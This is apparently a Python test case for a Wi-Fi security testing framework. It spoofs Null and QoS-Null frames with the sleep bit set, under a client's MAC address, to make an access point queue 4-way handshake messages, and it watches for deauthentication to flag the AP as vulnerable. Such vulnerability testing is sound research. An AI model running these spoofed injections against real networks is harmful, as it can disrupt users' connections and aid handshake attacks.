# test_queue_4way_sleep_attack.py
#
# Aggressive 4-way handshake queueing test.
# - multiple scheduled early injections (0ms, 5ms, 20ms)
# - reactive immediate injection when an AssocResp is observed on-air (best-effort)
# - injects Null and QoS-Null with pw-mgt (sleep) bit set
# - passive detection: AP->client EAPOL observed? client deauth observed?
#
from dependencies.libwifi.wifi import *
from library.testcase import Trigger, Action, Test
import threading
import time


class Queue4WaySleepAttack(Test):
    """
    Test for queued 4-way handshake messages (paper §4.3).
    Heuristic: client sends deauth / disconnect while we did NOT observe AP->client EAPOL -> AP LIKELY VULNERABLE
    """
    name = "queue-4way-sleep-aggressive"
    kind = Test.Supplicant

    def __init__(self):
        # Choose earliest available trigger for injection
        assoc_trigger = Trigger.Associated if hasattr(
            Trigger, "Associated") else Trigger.Connected

        # actions:
        # 0-2: scheduled injects (assoc_trigger)
        # 3: passive receive for AP->client EAPOL
        # 4: passive receive for deauth frames
        # 5: terminate after observation window
        super().__init__([
            Action(trigger=assoc_trigger, action=Action.Inject),
            Action(trigger=assoc_trigger, action=Action.Inject),
            Action(trigger=assoc_trigger, action=Action.Inject),

            Action(trigger=Trigger.Connected, action=Action.Receive),
            Action(trigger=Trigger.Connected, action=Action.Receive),

            Action(trigger=Trigger.Connected, action=Action.Terminate)
        ])

        # detection flags
        self.eapol_seen = False
        self.client_deauth_seen = False
        self.ap_deauth_seen = False
        self.null_seen_count = 0
        self._reactive_injected = False
        self._inject_lock = threading.Lock()

    def _best_effort_reactive_inject(self, station):
        """
        Try to immediately schedule/send an injection when we detect an AssocResp on-air.
        This is best-effort: the framework may queue the action, but it increases odds.
        """
        with self._inject_lock:
            if self._reactive_injected:
                return

            null_frame = Dot11(type="Data", subtype=4,
                               addr1=station.bss, addr2=station.mac, addr3=station.bss)
            null_frame.FCfield |= Dot11(FCfield="pw-mgt").FCfield

            qos_null = Dot11(type="Data", subtype=12,
                             addr1=station.bss, addr2=station.mac, addr3=station.bss)
            qos_null.FCfield |= Dot11(FCfield="pw-mgt").FCfield

            # try to set action[0] to immediate null; fallback to action[1] qos-null, etc.
            try_actions = [(0, null_frame), (1, qos_null), (2, null_frame)]
            for idx, frame in try_actions:
                try:
                    self.actions[idx].set_frame(frame, mon=True, encrypt=False)
                    self.actions[idx].set_delay(delay=0.0)
                    self._reactive_injected = True
                    log(STATUS, "Reactive immediate inject scheduled (action=%d, subtype=%d)" %
                        (idx, frame.subtype), color="magenta")
                    return
                except Exception as e:
                    # try next
                    log(DEBUG, "Reactive inject scheduling failed for action %d: %s" % (
                        idx, str(e)), color="cyan")
                    continue

            log(STATUS, "Reactive injection attempted but no action could be scheduled immediately", color="yellow")

    def receive(self, station, frame):
        # Only inspect Dot11 frames
        if not frame.haslayer(Dot11):
            return False

        addr1 = frame[Dot11].addr1
        addr2 = frame[Dot11].addr2

        # ignore unrelated frames
        if addr1 not in (station.mac, station.bss) and addr2 not in (station.mac, station.bss):
            return False

        # Detect Association Response (AssocResp subtype=1) or ReassocResp (3)
        if frame.type == 0 and frame.subtype in (1, 3):
            # ensure it's the response for our station (addr1 == station.mac)
            if frame[Dot11].addr1 == station.mac and frame[Dot11].addr2 == station.bss:
                log(DEBUG, "AssocResp/ReassocResp seen on-air: %s" %
                    frame.summary(), color="cyan")
                # best-effort immediate injection
                try:
                    self._best_effort_reactive_inject(station)
                except Exception as e:
                    log(STATUS, "Reactive inject exception: %s" %
                        str(e), color="yellow")
                return True

        # Detect AP->client EAPOL frames (EAPOL often carried in Data frames with SNAP/LLC)
        if frame.haslayer(EAPOL) and frame[Dot11].addr1 == station.mac and frame[Dot11].addr2 == station.bss:
            log(STATUS, "Observed AP->client EAPOL on-air: %s" %
                frame.summary(), color="green")
            self.eapol_seen = True
            return True

        # Detect deauthentication frames
        if frame.haslayer(Dot11Deauth):
            # client -> AP (client deauth)
            if frame[Dot11].addr2 == station.bss and frame[Dot11].addr1 == station.mac:
                log(STATUS, "Client->AP deauth observed: %s" %
                    frame.summary(), color="orange")
                self.client_deauth_seen = True
                if not self.eapol_seen:
                    log(STATUS, "HEURISTIC: client deauth WITHOUT observed AP->client EAPOL -> AP LIKELY VULNERABLE", color="red")
                else:
                    log(STATUS, "Client deauth observed but AP->client EAPOL was seen -> ambiguous", color="yellow")
                return True

            # AP -> client deauth observed on-air
            if frame[Dot11].addr2 == station.mac and frame[Dot11].addr1 == station.bss:
                log(STATUS, "AP->client deauth observed on-air: %s" %
                    frame.summary(), color="blue")
                self.ap_deauth_seen = True
                return True

        # Count observed null-data frames that match our spoof pattern (optional)
        try:
            if frame.type == 2 and frame.subtype == 4:
                if frame[Dot11].addr1 == station.bss and frame[Dot11].addr2 == station.mac:
                    self.null_seen_count += 1
                    log(DEBUG, "Observed null-data on-air matching spoof (count=%d): %s" %
                        (self.null_seen_count, frame.summary()), color="cyan")
        except Exception:
            pass

        return False

    def generate(self, station):
        # Build frame variants
        null_frame = Dot11(type="Data", subtype=4, addr1=station.bss,
                           addr2=station.mac, addr3=station.bss)
        null_frame.FCfield |= Dot11(FCfield="pw-mgt").FCfield

        qos_null = Dot11(type="Data", subtype=12, addr1=station.bss,
                         addr2=station.mac, addr3=station.bss)
        qos_null.FCfield |= Dot11(FCfield="pw-mgt").FCfield

        # Scheduled tiny delays: 0ms, 5ms, 20ms (tune to your hardware)
        delays = [0.0, 0.005, 0.02]
        frames = [null_frame, qos_null, null_frame]

        for i, (f, d) in enumerate(zip(frames, delays)):
            if i < 3:
                try:
                    self.actions[i].set_frame(f, mon=True, encrypt=False)
                    self.actions[i].set_delay(delay=d)
                    log(DEBUG, "Scheduled inject #%d subtype=%d delay=%.3fs" %
                        (i+1, f.subtype, d), color="cyan")
                except Exception as e:
                    log(STATUS, "Failed to schedule inject #%d: %s" %
                        (i+1, str(e)), color="yellow")

        # Passive listeners for EAPOL and Deauth
        self.actions[3].set_receive(self.receive, mon=True)
        self.actions[4].set_receive(self.receive, mon=True)

        # Long observation window (allow handshake timeouts)
        self.actions[5].set_delay(delay=25)
        log(STATUS, "Test scheduled. Observation window=25s. IMPORTANT: clear PMKSA before running (use wrapper).", color="green")
